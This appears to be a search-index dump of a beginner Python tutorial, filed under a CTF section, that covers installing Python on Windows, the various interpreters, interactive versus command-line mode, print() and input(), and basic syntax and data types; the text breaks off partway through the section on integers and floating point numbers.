<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Command Prompt                                    - \u25a1 x \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502Microsoft Windows [Version 10.0.0]                      \u2502\n\u2502(c) 2015 Microsoft Corporation. All rights reserved.    \u2502\n\u2502                                                        \u2502\n\u2502C:\\&gt; python                                             \u2502\n\u2502Python 3.8.x ...                                        \u2502\n\u2502[MSC v... 64 bit (AMD64)] on win32                      \u2502\n\u2502Type \"help\", \"copyright\", \"credits\" or \"license\" for mor\u2502\n\u2502information.                                            \u2502\n\u2502&gt;&gt;&gt; _                                                   \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Seeing the above screen means that Python was installed successfully!</p> <p>The fact that you see the prompt <code>&gt;&gt;&gt;</code> means that we are in the Python interactive environment and can type any Python code, and you will get the execution result immediately after entering. Now, type <code>exit()</code> and enter to exit the Python interactive environment (you can also close the command line window directly).</p> <p>Case 2: You get an error.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Command Prompt                                    - \u25a1 x \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502Microsoft Windows [Version 10.0.0]                      \u2502\n\u2502(c) 2015 Microsoft Corporation. All rights reserved.    \u2502\n\u2502                                                        \u2502\n\u2502C:\\&gt; python                                             \u2502\n\u2502'python' is not recognized as an internal or external co\u2502\n\u2502mmand, operable program or batch file.                  \u2502\n\u2502                                                        \u2502\n\u2502C:\\&gt; _                                                  \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>This is because Windows will look for <code>python.exe</code> based on the path set by a <code>Path</code> environment variable, and if it doesn't find it, it will report an error. If you missed checking <code>Add Python 3.8 to PATH</code> during installation, you will have to manually add the path where <code>python.exe</code> is located to the Path.</p> <p>If you don't know how to change the environment variables, we recommend running the Python installer again, making sure to check <code>Add Python 3.8 to PATH</code>.</p>"},{"location":"CTF/Python_1/#python-interpreter","title":"Python interpreter","text":"<p>When we write Python code, we get a text file with a <code>.py</code> extension that contains Python code. To run the code, a Python interpreter is needed to execute the <code>.py</code> file.</p> <p>Since the entire Python language is open source, from the specification to the interpreter, theoretically anyone with a high enough level of proficiency could write a Python interpreter to execute Python code (with great difficulty, of course). In fact, multiple Python interpreters do exist.</p>"},{"location":"CTF/Python_1/#cpython","title":"CPython","text":"<p>When we download and install Python 3.x from the official Python website, we get an official version of the interpreter directly: CPython. This interpreter is developed in C, hence the name CPython. Running <code>python</code> at the command line is to start the CPython interpreter.</p> <p>CPython is the most widely used Python interpreter. All the code in the tutorial is also executed under CPython.</p>"},{"location":"CTF/Python_1/#ipython","title":"IPython","text":"<p>IPython is an interactive interpreter based on CPython. That is, IPython is only enhanced in the way it interacts, but the functionality of executing Python code is exactly the same as CPython. It's like many domestic browsers have different appearances, but the kernel is actually calling IE.</p> <p>CPython uses <code>&gt;&gt;&gt;</code> as the prompt, while IPython uses <code>In [serial number]:</code> as the prompt.</p>"},{"location":"CTF/Python_1/#pypy","title":"PyPy","text":"<p>PyPy is another Python interpreter that targets execution speed. PyPy uses JIT technology to dynamically compile (note that it does not interpret) Python code, so it can significantly improve the execution speed of Python code.</p> <p>The vast majority of Python code will run under PyPy, but PyPy and CPython are somewhat different, which results in the same Python code executing under both interpreters may have different results. If your code is going to be executed under PyPy, you need to understand the differences between PyPy and CPython.</p>"},{"location":"CTF/Python_1/#jython","title":"Jython","text":"<p>Jython is a Python interpreter that runs on the Java platform and can compile Python code directly into Java bytecode for execution.</p>"},{"location":"CTF/Python_1/#ironpython","title":"IronPython","text":"<p>IronPython is similar to Jython, except that IronPython is a Python interpreter that runs on Microsoft.</p>"},{"location":"CTF/Python_1/#summary","title":"Summary","text":"<p>There are many interpreters for Python, but the most widely used is CPython. If you want to interact with Java or .Net.</p> <p>All code in this tutorial is guaranteed to run under CPython version 3.x only. Be sure to install CPython locally (that is, download the installer from the official Python website).</p>"},{"location":"CTF/Python_1/#first-python-program","title":"First Python program","text":"<p>Before we officially write our first Python program, let's review what command line mode and Python interaction mode are.</p>"},{"location":"CTF/Python_1/#command-line-mode","title":"Command Line Mode","text":"<p>Select \"Command Prompt\" in the Windows Start menu to enter command line mode, which has a prompt similar to <code>C:\\&gt;</code>.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Command Prompt                                    - \u25a1 x \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502Microsoft Windows [Version 10.0.0]                      \u2502\n\u2502(c) 2015 Microsoft Corporation. All rights reserved.    \u2502\n\u2502                                                        \u2502\n\u2502C:\\&gt; _                                                  \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"CTF/Python_1/#python-interactive-mode","title":"Python interactive mode","text":"<p>Type the command <code>python</code> in command line mode, you will see a bunch of text output like the following, then you will enter Python interactive mode, its prompt is <code>&gt;&gt;&gt;</code>.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Command Prompt - python                           - \u25a1 x \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502Microsoft Windows [Version 10.0.0]                      \u2502\n\u2502(c) 2015 Microsoft Corporation. All rights reserved.    \u2502\n\u2502                                                        \u2502\n\u2502C:\\&gt; python                                             \u2502\n\u2502Python 3.7 ... on win32                                 \u2502\n\u2502Type \"help\", ... for more information.                  \u2502\n\u2502&gt;&gt;&gt; _                                                   \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>By typing <code>exit()</code> and entering in Python interactive mode, you exit Python interactive mode and return to command line mode:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Command Prompt                                    - \u25a1 x \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502Microsoft Windows [Version 10.0.0]                      \u2502\n\u2502(c) 2015 Microsoft Corporation. All rights reserved.    \u2502\n\u2502                                                        \u2502\n\u2502C:\\&gt; python                                             \u2502\n\u2502Python 3.7 ... on win32                                 \u2502\n\u2502Type \"help\", ... for more information.                  \u2502\n\u2502&gt;&gt;&gt; exit()                                              \u2502\n\u2502                                                        \u2502\n\u2502C:\\&gt; _                                                  \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>You can also select the <code>Python (command line)</code> menu item directly from the Start menu to enter Python interactive mode directly, but the window will close directly after typing <code>exit()</code> and will not return to command line mode.</p> <p>Once we understand how to start and exit Python's interactive mode, we can officially start writing Python code.</p> <p>Before writing code, please never paste code from a page to your own computer using \"copy\"-\"paste\". In the process of writing code, beginners often make mistakes: incorrect spelling, incorrect capitalization, mixed use of English and Chinese punctuation, mixed use of spaces and tabs, so you need to check and cross-check carefully in order to master how to write programs as fast as possible.</p> <p></p> <p>At the interactive mode prompt <code>&gt;&gt;&gt;</code>, type the code directly and press enter to get the code execution result immediately. Now, try typing <code>100+200</code> and see if the calculation results in 300.</p> <pre><code>&gt;&gt;&gt; 100+200\n300\n</code></pre> <p>Pretty simple, right? Any valid mathematical calculation will work out.</p> <p>To get Python to print out the specified text, use the <code>print()</code> function and then enclose the text you wish to print in single or double quotes, but not a mix of single and double quotes:</p> <pre><code>&gt;&gt;&gt; print('hello, world')\nhello, world\n</code></pre> <p>This kind of text enclosed in single or double quotes is called a string in the program, and we will encounter it often in the future.</p> <p>Finally, exit Python with <code>exit()</code> and our first Python program is done! The only downside is that it wasn't saved, so you'll have to type the code again the next time you run it.</p>"},{"location":"CTF/Python_1/#command-line-mode-and-python-interactive-mode","title":"Command line mode and Python interactive mode","text":"<p>Please note the distinction between command line mode and Python interactive mode.</p> <p>In command line mode, you can execute <code>python</code> to enter the Python interactive environment, or you can execute <code>python hello.py</code> to run a <code>.py</code> file.</p> <p>Executing a <code>.py</code> file can only be executed in command line mode. If you hit the command <code>python hello.py</code> and see the following error.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Command Prompt                                    _ \u25a1 x \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502Microsoft Windows [Version 10.0.0]                      \u2502\n\u2502(c) 2015 Microsoft Corporation. All rights reserved.    \u2502\n\u2502                                                        \u2502\n\u2502C:\\&gt; python hello.py                                    \u2502\n\u2502python: can't open file 'hello.py': [Errno 2] No such   \u2502\n\u2502file or directory                                       \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>The error message <code>No such file or directory</code> indicates that <code>hello.py</code> is not found in the current directory, you must first switch the current directory to the directory where <code>hello.py</code> is located in order to execute properly.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Command Prompt                                    _ \u25a1 x \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502Microsoft Windows [Version 10.0.0]                      \u2502\n\u2502(c) 2015 Microsoft Corporation. All rights reserved.    \u2502\n\u2502                                                        \u2502\n\u2502C:\\&gt; cd work                                            \u2502\n\u2502                                                        \u2502\n\u2502C:\\work&gt; python hello.py                                \u2502\n\u2502Hello, world!                                           \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2502                                                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>In addition, running a <code>.py</code> file in command-line mode is different from running Python code directly in the Python interactive environment, which automatically prints out the result of each line of Python code, but running Python code directly does not.</p> <p>For example, in the Python interactive environment, type.</p> <pre><code>&gt;&gt;&gt; 100 + 200 + 300\n600\n</code></pre> <p>You can see the result <code>600</code> directly.</p> <p>However, write a <code>calc.py</code> file with the following content.</p> <pre><code>100 + 200 + 300\n</code></pre> <p>Then, in command line mode, execute.</p> <pre><code>C:\\work&gt;python calc.py\n</code></pre> <p>Nothing output was found.</p> <p>This is normal. To output the result, you must print it out yourself with <code>print()</code>. Transform <code>calc.py</code> to.</p> <pre><code>print(100 + 200 + 300)\n</code></pre> <p>Executing it again, you can see the result.</p> <pre><code>C:\\work&gt;python calc.py\n600\n</code></pre> <p>Finally, the Python interactive mode code is typed one line and executed one line, while the command line mode directly runs the <code>.py</code> file to execute all the code in the file at once. As you can see, Python interactive mode is mainly for debugging Python code and for beginners to learn, it isn't an environment to run Python code officially!</p>"},{"location":"CTF/Python_1/#syntaxerror","title":"SyntaxError","text":"<p>If <code>SyntaxError</code> is encountered, it means that there is a syntax error in the input Python code. The most common type of syntax error is the use of Chinese punctuation, such as the use of Chinese brackets <code>\uff08</code> and <code>\uff09</code>.</p> <pre><code>&gt;&gt;&gt; print\uff08'hello'\uff09\n  File \"&lt;stdin&gt;\", line 1\n    print\uff08'hello'\uff09\n         ^\nSyntaxError: invalid character '\uff08' (U+FF08)\n</code></pre> <p>Or the Chinese quotation marks <code>\u201c</code> and <code>\u201d</code> are used.</p> <pre><code>&gt;&gt;&gt; print(\u201chello\u201d)\n  File \"&lt;stdin&gt;\", line 1\n    print(\u201chello\u201d)\n          ^\nSyntaxError: invalid character '\u201c' (U+201C)\n</code></pre> <p>When an error occurs, be sure to read the cause of the error. For the above <code>SyntaxError</code>, the interpreter will explicitly state that the cause of the error is the unrecognized character <code>\"</code>: <code>invalid character '\"</code>.</p>"},{"location":"CTF/Python_1/#summary_1","title":"Summary","text":"<p>In Python interactive mode, you can type code directly, then execute it and get the result immediately.</p> <p>In command line mode, you can run the <code>.py</code> file directly.</p>"},{"location":"CTF/Python_1/#using-a-text-editor","title":"Using a text editor","text":"<p>The advantage of writing a program on Python's interactive command line is that you get the result in a single click, but the disadvantage is that you can't save it and you have to knock it again the next time you want to run it.</p> <p>So, in practice, we always use a text editor to write the code, and when we're done, we save it as a file so that the program can be run again and again.</p> <p>Now, let's take the last <code>'hello, world'</code> program and write it in a text editor and save it.</p> <p>So here's the question: which is the best text editor?</p>"},{"location":"CTF/Python_1/#visual-studio-code","title":"Visual Studio Code!","text":"<p>We recommend Visual Studio Code from Microsoft, it's not the big Visual Studio, it's a streamlined version of Mini Visual Studio, and, Visual Studio Code can be used across! Platforms! Windows, Mac, and Linux universally.</p> <p>Please note, do not use Word and Windows Notepad. Word saves not plain text files, and Notepad will smartly add a few special characters (UTF-8 BOM) at the beginning of the file, which will result in inexplicable errors in running the program.</p> <p>With the text editor installed, enter the following code.</p> <pre><code>print('hello, world')\n</code></pre> <p>Note that there should not be any spaces in front of <code>print</code>. Then, select a directory, for example, <code>C:\\work</code>, save the file as <code>hello.py</code>, and you can open a command line window, switch the current directory to the directory where <code>hello.py</code> is located, and you can run the program as follows.</p> <pre><code>C:\\work&gt; python hello.py\nhello, world\n</code></pre> <p>It can also be saved as another name, such as <code>first.py</code>, but it must end with <code>.py</code>, nothing else will work. In addition, the file name can only be a combination of letters, numbers, and underscores.</p> <p>If there is no <code>hello.py</code> file in the current directory, running <code>python hello.py</code> will report the following error.</p> <pre><code>C:\\Users\\IEUser&gt; python hello.py\npython: can't open file 'hello.py': [Errno 2] No such file or directory\n</code></pre> <p>The error means that the file <code>hello.py</code> cannot be opened because it does not exist. In this case, you have to check whether the file exists in the current directory. If <code>hello.py</code> is stored in another directory, you should first switch to the current directory with the <code>cd</code> command.</p>"},{"location":"CTF/Python_1/#inputs-and-outputs","title":"Inputs and Outputs","text":""},{"location":"CTF/Python_1/#output","title":"Output","text":"<p>Using <code>print()</code> with a string in parentheses, you can output the specified text to the screen. For example, outputting <code>'hello, world'</code> is implemented in code as follows.</p> <pre><code>&gt;&gt;&gt; print('hello, world')\n</code></pre> <p>The <code>print()</code> function can also accept multiple strings, separated by a comma \",\", which can be concatenated into one string of output.</p> <pre><code>&gt;&gt;&gt; print('The quick brown fox', 'jumps over', 'the lazy dog')\nThe quick brown fox jumps over the lazy dog\n</code></pre> <p><code>print()</code> will print each string in turn, and will output a space when it encounters a comma \",\", so that the output string is spelled out like this:</p> <p></p> <p><code>print()</code> can also print an integer, or the result of a calculation.</p> <pre><code>&gt;&gt;&gt; print(300)\n300\n&gt;&gt;&gt; print(100 + 200)\n300\n</code></pre> <p>Therefore, we can print the result of calculating <code>100 + 200</code> a little more nicely as follows.</p> <pre><code>&gt;&gt;&gt; print('100 + 200 =', 100 + 200)\n100 + 200 = 300\n</code></pre> <p>Note that for <code>100 + 200</code>, the Python interpreter automatically calculates the result <code>300</code>, however, <code>'100 + 200 ='</code> is a string and not a mathematical formula, Python treats it as a string, please interpret the above printout yourself.</p>"},{"location":"CTF/Python_1/#input","title":"Input","text":"<p>Now, you can already output the result you want with <code>print()</code>. But what if you want the user to enter some characters from the computer? Python provides an <code>input()</code> that allows the user to enter a string and store it in a variable. For example, enter the user's name.</p> <pre><code>&gt;&gt;&gt; name = input()\nMichael\n</code></pre> <p>Once you type <code>name = input()</code> and hit enter, the Python interactive command line is waiting for your input. At this point, you can type any character you want, then press enter and finish typing.</p> <p>When you're done, there's no prompt, and the Python interactive command line goes back to <code>&gt;&gt;&gt;</code>. So where does the content we just typed go? The answer is that it is stored in the <code>name</code> variable. You can see the contents of the variable by typing <code>name</code> directly.</p> <pre><code>&gt;&gt;&gt; name\n'Michael'\n</code></pre> <p>What is a variable? Remind yourself of the basics of algebra learned in junior high school mathematics.</p> <p>Let the side length of a square be <code>a</code>, then the area of the square is <code>a x a</code>. Thinking of the side length <code>a</code> as a variable, we can calculate the area of the square based on the value of <code>a</code>, e.g.</p> <p>If a = 2, the area is a x a = 2 x 2 = 4.</p> <p>If a = 3.5, then the area is a x a = 3.5 x 3.5 = 12.25.</p> <p>In computer programs, variables can be not only integers or floating point numbers, but also strings, so <code>name</code> as a variable is a string.</p> <p>To print out the contents of the <code>name</code> variable, in addition to writing <code>name</code> directly and pressing enter, the <code>print()</code> function can be used.</p> <pre><code>&gt;&gt;&gt; print(name)\nMichael\n</code></pre> <p>With input and output, we can change the last program that printed <code>hello, world'</code> to something that makes some sense:</p> <pre><code>name = input()\nprint('hello,', name)\n</code></pre> <p>Running the above program, the first line of code will ask the user to enter any character as his or her name, which will then be stored in the <code>name</code> variable; the second line of code will say <code>hello</code> to the user based on his or her name, for example, enter <code>Michael</code>.</p> <pre><code>C:\\Workspace&gt; python hello.py\nMichael\nhello, Michael\n</code></pre> <p>But the program runs without any prompt message telling the user: \"Hey, hurry up and enter your name\", which seems very unfriendly. Fortunately, <code>input()</code> allows you to display a string to prompt the user, so we changed the code to:</p> <pre><code>name = input('please enter your name: ')\nprint('hello,', name)\n</code></pre> <p>Run the program again and you will find that as soon as the program runs, it will first print out <code>please enter your name:</code> so that the user can follow the prompt and enter the name and get the output of <code>hello, xxx</code> as follows:</p> <pre><code>C:\\Workspace&gt; python hello.py\nplease enter your name: Michael\nhello, Michael\n</code></pre> <p>Each time you run the program, the output will be different depending on the user input.</p> <p>At the command line, input and output are just that simple.</p>"},{"location":"CTF/Python_1/#summary_2","title":"Summary","text":"<p>Any computer program is designed to perform a specific task. With input, the user can tell the computer program the information it needs, and with output, the program runs and tells the user the result of the task.</p> <p>Input is Input and Output is Output, so we refer to input and output collectively as Input/Output, or abbreviated as IO.</p> <p><code>input()</code> and <code>print()</code> are the most basic input and output from the command line, but users can also do input and output through other more advanced graphical interfaces, for example, typing your name in a text box on a web page, clicking \"OK\" and see the output on the web page.</p>"},{"location":"CTF/Python_2/","title":"Python Programming Quick Guide - Syntax","text":"<p>https://www.liaoxuefeng.com/wiki/1016959663602400/1017063413904832</p> <p>https://docs.python.org/3/tutorial/index.html</p>"},{"location":"CTF/Python_2/#python-basics","title":"Python Basics","text":"<p>Python is a computer programming language. A computer programming language is different from the natural language we use every day. The biggest difference is that natural languages are understood differently in different contexts, and a computer must ensure that the program written in the programming language must not be ambiguous if it is to perform its tasks according to the programming language. Python is no exception.</p> <p>Python's syntax is relatively simple, indented, and written like the following.</p> <pre><code># print absolute value of an integer:\na = 100\nif a &gt;= 0:\n    print(a)\nelse:\n    print(-a)\n</code></pre> <p>Statements starting with <code>#</code> are comments, which are for human eyes and can be anything, and are ignored by the interpreter. Every other line is a statement, and when the statement ends with a colon <code>:</code>, the indented statement is considered a block of code.</p> <p>Indentation has advantages and disadvantages. The advantage is that it forces you to write formatted code, but there is no rule about whether the indent is a few spaces or a tab. by convention, you should always stick to the 4-spaces indent.</p> <p>Another advantage of indentation is that it forces you to write less indented code, and you will tend to split a long piece of code into several functions to get less indented code.</p> <p>The downside of indentation is that the \"copy-paste\" feature is disabled, which is the worst part. When you refactor your code, the pasted code has to be rechecked for correct indentation. In addition, it's hard for the IDE to format Python code the way it formats Java code.</p> <p>Finally, be sure to note that Python programs are case-sensitive, and if you write the wrong case, the program will report an error.</p>"},{"location":"CTF/Python_2/#summary","title":"Summary","text":"<p>Python uses indentation to organize blocks of code, so be sure to follow the convention and stick to a 4-space indent.</p> <p>In the text editor, you need to set up the automatic conversion of tabs to 4 spaces to make sure you don't mix tabs and spaces.</p>"},{"location":"CTF/Python_2/#data-types-and-variables","title":"Data types and variables","text":""},{"location":"CTF/Python_2/#data-types","title":"Data types","text":"<p>A computer is, as the name implies, a machine that can do mathematical calculations, so it is logical that computer programs can handle all kinds of numerical values. However, computers can handle much more than just numeric values. They can also handle text, graphics, audio, video, web pages, and a wide variety of other data, and different data requires different data types to be defined. In Python, the data types that can be handled directly are as follows.</p>"},{"location":"CTF/Python_2/#integers","title":"integers","text":"<p>Python can handle integers of any size, including negative integers of course, represented in programs exactly as they are written in mathematics, for example: <code>1</code>, <code>100</code>, <code>-8080</code>, <code>0</code>, and so on.</p> <p>Since computers use binary, it is sometimes easier to represent integers in hexadecimal, which is represented by the <code>0x</code> prefix and 0-9, a-f, for example: <code>0xff00</code>, <code>0xa5b4c3d2</code>, and so on.</p> <p>For very large numbers, such as <code>10000000000</code>, it is difficult to count the number of zeros. python allows numbers to be separated by <code>_</code>, so writing <code>10_000_000_000</code> is exactly the same as <code>10000000000</code>. Hexadecimal numbers can also be written as <code>0xa1b2_c3d4</code>.</p>"},{"location":"CTF/Python_2/#floating-point-numbers","title":"floating point numbers","text":"<p>Floating point numbers, also known as decimals, are called floating point numbers because the position of the decimal point of a floating point number is variable when expressed in scientific notation, for example, 1.23x109 is exactly the same as 12.3x108. Floating point numbers can be written mathematically, such as <code>1.23</code>, <code>3.14</code>, <code>-9.01</code>, and so on. But for very large or small floating point numbers, they must be expressed in scientific notation, replacing 10 with e. 1.23x109 is <code>1.23e9</code>, or <code>12.3e8</code>, 0.000012 can be written as <code>1.2e-5</code>, and so on.</p> <p>Integers and floating point numbers are stored 